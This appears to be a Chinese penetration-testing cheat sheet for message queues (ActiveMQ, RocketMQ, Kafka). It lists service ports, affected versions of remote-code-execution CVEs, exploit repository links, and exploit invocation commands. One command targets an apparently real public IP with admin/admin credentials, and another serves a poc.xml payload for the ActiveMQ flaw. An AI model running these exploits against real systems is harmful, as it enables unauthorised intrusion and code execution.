![消息中间件](xx.jpg)

## 消息队列：（Message Queue）

基于异步通信模式的中间件技术，核心功能是在不同的应用程序、服务或组件之间传递消息（数据），起到缓冲、解耦、削峰等作用。发送方（生产者）将消息放入队列后即可返回，无需等待接收方（消费者）立即处理；接收方则从队列中按需获取消息并处理，实现了发送方和接收方的异步解耦

常见的消息队列产品包括:(广泛应用于分布式系统、微服务架构中)
Apache Kafka、RabbitMQ、ActiveMQ、RocketMQ等

## ActiveMQ

端口        条件
8161        web 需配置访问
61616      tcp 远程访问

开源的消息中间件，它支持Java消息服务、集群、Spring Framework等

### CVE-2022-41678

在5.16.5, 5.17.3版本及以前

```
python poc.py -u admin -p admin http://101.32.220.14:8161/****
```

### CVE-2023-46604

在5.18.2版本及以前

```
python3 -m http.server 6666
python3 poc.py 目标IP 目标端口 http://IP:6666/poc.xml
```

## RocketMQ

Apache RocketMQ是一个分布式消息平台

端口号           用途说明
9876              NameServer通信端口用于客户端路由请求和Broker注册发现
10911            Broker主监听端口处理消息发送/消费等核心服务

### CVE-2023-33246 CVE-2023-37582

参考：
https://mp.weixin.qq.com/s/UsjzX-HSt7QE1QeVBdEXaw
https://mp.weixin.qq.com/s/ceZY_TJqsaWyyHubrlKqSw

利用poc:
https://github.com/vulhub/rocketmq-attack
https://github.com/Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT

```
python check.py --ip ip --port 9876

java -jar rocketmq-attack-1.1-SNAPSHOT.jar AttackBroker --target ip:port --cmd "xxxx"
```

### CVE-2023-37582

```
python.exe CVE-2023-37582.py -ip ip -p 9876
```

## Kafka

分布式流处理平台，用于高吞吐量实时数据传输存储和处理，
广泛应用于日志收集、消息队列、数据管道、实时分析等场景

### CVE-2023-25194

漏洞影响版本：2.3.0 <= Apache Kafka <= 3.3.2

https://github.com/vulhub/vulhub/blob/master/kafka/CVE-2023-25194/README.zh-cn.md